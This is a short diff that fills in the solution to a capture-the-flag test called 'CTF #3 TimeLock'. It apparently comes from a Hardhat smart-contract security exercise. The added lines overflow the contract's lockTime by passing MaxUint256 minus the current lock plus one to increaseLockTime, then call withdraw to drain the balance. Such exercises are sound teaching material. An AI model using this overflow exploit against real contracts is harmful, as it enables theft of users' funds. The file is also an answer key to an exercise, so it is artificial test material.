@@ -1,4 +1,5 @@
 const { expect } = require('chai');
+const { ethers } = require('hardhat');
 
 // run the test
 // npx hardhat test ./test/N3-TimeLock-easy.js
@@ -16,6 +17,11 @@ describe('CTF #3 TimeLock', function () {
 
   it('Should recover all funds', async function () {
     // Your code goes here
+    const lockTime = await challengeInstance.lockTime(user.address);
+    const newLockTime = ethers.constants.MaxUint256.sub(lockTime).add(1);
+    await challengeInstance.increaseLockTime(newLockTime);
+
+    await challengeInstance.withdraw();
 
     expect(await challengeInstance.balances(user.address)).to.equal('0');
   });
